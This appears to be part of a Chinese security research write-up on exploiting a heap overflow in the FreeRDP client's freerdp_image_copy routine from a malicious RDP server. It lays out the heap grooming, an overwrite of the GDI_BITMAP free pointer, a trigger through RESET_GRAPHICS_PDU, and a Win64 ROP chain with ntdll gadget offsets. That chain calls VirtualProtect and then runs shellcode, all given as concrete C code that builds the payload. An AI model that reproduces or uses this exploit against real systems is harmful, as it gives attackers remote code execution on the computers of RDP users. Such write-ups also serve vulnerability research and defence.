@@ -1,0 +1,86 @@
+            rfx_process_message();
+        case RDP_CODEC_ID_NSCODEC:
+            nsc_process_message();
+        case RDP_CODEC_ID_NONE:
+            freerdp_image_copy()
+    }
+    }
+最后来到数据越界的函数freerdp_image_copy()，这里的copyDstWidth、nYDst、nDstStep 、xDstOffset
+变量都是可控制的，memcpy这里将会越界写
+这里有个问题，CreateDIBSection分配的是以4096页为基数的大内存，而此片内存并没有在freerdp进程内，即使越界写也很难覆写到freerdp的内存，而这里将desktopWidth或desktopHeight置0的话，将会导致CreateDIBSection分配内存失败，导致失败后将会在gdi_init_primary中进入另一条路径`gdi_CreateCompatibleBitmap`，而这里将会调用`_aligned_malloc`以16字节对称来分配内存，而这里desktopWidth或desktopHeight置0，所以将会分配16字节大小的稳定内存，而这个内存是在freerdp进程内的。
+## 0x09 假如说能获取信息泄露
+假如这里通过自制工具可以泄露堆地址，比如从最轻松简单的开始，通过泄露越界内存的地址，这个结构体就在`gdi_CreateCompatibleBitmap`中调用并分配了将会越界的内存
+观察以下结构体将会发现data指针后面将会有个free的函数指针，这里泄露两个地址，GDI_BITMAP结构体的地址和data指针的地址，只要GDI_BITMAP结构体的地址高于data指针的地址，就可以计算出偏移offset，通过设置offset精确的将free覆盖，最后通过主动调用free，这样就可以控制rip了
+## 0x10 精确计算offset
+再来回顾下nYDst 是cmd->destTop,nDstStep 是cmd->bmp.width *
+4，xDstOffset为cmd.destLeft*4，copyDstWidth为cmd->bmp.width * 4
+    BYTE* dstLine = &pDstData[(y + nYDst) * nDstStep * dstVMultiplier + dstVOffset];
+    memcpy(&dstLine[xDstOffset], &srcLine[xSrcOffset], copyDstWidth);
+这里offset = gdiBitmap_addr - Bitmapdata_addr;
+需要通过设置nYDst * nDstStep *1 + xDstOffset = offset
+发送bitmapdata 的数据包括shellcode的大小是1060，头部大小是36
+shellcode的布局如下:
+最后的计算如下:
+    if (gdi_addr > Bitmapdata_addr)
+    {
+        eip_offset = gdi_addr - Bitmapdata_addr;
+        char okdata = eip_offset % 4;
+        UINT64 copywidth = 1024 * 0xffff;
+        if (okdata == 0)
+        {
+            if (eip_offset free,通过发送RDPGFX_RESET_GRAPHICS_PDU消息将会重置，并且会先调用hBitmap->free释放初始化的资源。
+RDPGFX_RESET_GRAPHICS_PDU消息处理api流程如下:
+rdpgfx_on_data_received->rdpgfx_recv_pdu->rdpgfx_recv_reset_graphics_pdu->gdi_ResetGraphics->wf_desktop_resize->gdi_resize_ex->gdi_bitmap_free_ex
+通过调用hBitmap->free(hBitmap->data)，将会控制rip
+## 0x12 在win64上面构造rop链
+首先rop链的条件是得通过pop ret来利用栈上面的数据，所以说得控制栈上面的数据才能构造出完整的rop利用链，这里观察了下调用free时的寄存器值:
+    Rax = hBitmap->data rcx = hBitmap->data rdi = rsp + 0x40
+hBitmap->data的地址上面的堆数据正是被控制的数据，这里在忽略基址随机化的前提下，在ntdll中通过ROPgadget找到了这样的滑块:
+    48 8B 51 50               mov   rdx, [rcx+50h]
+    48 8B 69 18               mov   rbp, [rcx+18h]
+    48 8B 61 10               mov   rsp, [rcx+10h]
+    FF E2                     jmp   rdx
+只要执行这条rop链就可以完美控制rsp，接下来只需要调用win
+api来获取一片可执行代码的内存，这里采用最简单的方式就是直接调用virtprotect来改写shellcode存在的内存页为可执行状态，在x86_64上面，调用api都是通过寄存器来传参的，而virtprotect的传参如下:
+    Mov r9d,arg4
+    Mov r8d,arg3
+    Mov edx,arg2
+    Mov ecx,arg1
+    Call virtprotect
+综上所述，我的rop链代码是这样构造的:
+    UINT64 rop1 = 0x00000000000A2C08; //mov rdx, [rcx+50h], mov  rbp, [rcx+18h],mov rsp,    [rcx+10h],jmp rdx
+    UINT64 rop2 = 0x00008c4b4;    // ntdll pop r9 pop r10 pop r11 ret
+    UINT64 rop3 = 0x8c4b2;      //ntdll pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
+    UINT64 rop4 = 0xb416;      //ntdll pop rsp ret
+    UINT64 rop5 = 0x8c4b7;     //ntdll pop rdx; pop r11; ret
+    UINT64 rop6 = 0x21597;    //ntdll pop rcx; ret
+    UINT64 rop7 = 0x64CC0;    //virtprotect
+    UINT64 shellcode_addr = ntdll_Base_Addr + rop1;
+    UINT64 rsp_godget = gdi_addr - 104;
+    memcpy(&shellcode[956], &shellcode_addr, sizeof(shellcode_addr));//向后退32 + 64 rop   之rsp控制栈
+    memcpy(&shellcode[948], &gdi_addr, sizeof(gdi_addr));      //控制rcx
+    memcpy(&shellcode[940], &rsp_godget, sizeof(rsp_godget));   //rsp赋值
+    shellcode_addr = ntdll_Base_Addr + rop3;
+    memcpy(&shellcode[1004], &shellcode_addr, sizeof(shellcode_addr));//jmp rdx赋值,rop   开始执行
+    shellcode_addr = ntdll_Base_Addr + rop5;       //rop 栈赋值rdx
+    UINT64 ret1 = 924 - 72;
+    memcpy(&shellcode[ret1], &shellcode_addr, sizeof(shellcode_addr));
+    shellcode_addr = ntdll_Base_Addr + rop6;   //rop re2
+    UINT64 ret2 = 924 - 48;
+    memcpy(&shellcode[ret2], &shellcode_addr, sizeof(shellcode_addr));
+    shellcode_addr = KERNEL32Base_Addr + rop7;  //rop re3
+    UINT64 ret3 = 924 - 32;
+    memcpy(&shellcode[ret3], &shellcode_addr, sizeof(shellcode_addr));
+    UINT64 virtprotect_arg4 = 924 - 96;
+    shellcode_addr = gdi_addr - 112;      //rop virtprotect_arg4
+    memcpy(&shellcode[virtprotect_arg4], &shellcode_addr, sizeof(shellcode_addr));
+    UINT64 virtprotect_arg1 = 924 - 40;
+    shellcode_addr = gdi_addr - 888;    //rop virtprotect_arg4
+    memcpy(&shellcode[virtprotect_arg1], &shellcode_addr, sizeof(shellcode_addr));
+    memcpy(&shellcode[900], &shellcode_addr, sizeof(shellcode_addr)); //ret to shellcode
+    respose_to_rdp_client(shellcode, 1060);//attack heap overflow
+通过rop链到执行shellcode，寄存器rdi的值都没有被改写，所以最后在执行shellcode的时候，可以通过rdi来恢复栈地址，这里是通过最简单的方式了:
+`Mov rsp,rdi`
+最后执行shellcode。
+请勿用于其他途径。
+* * *
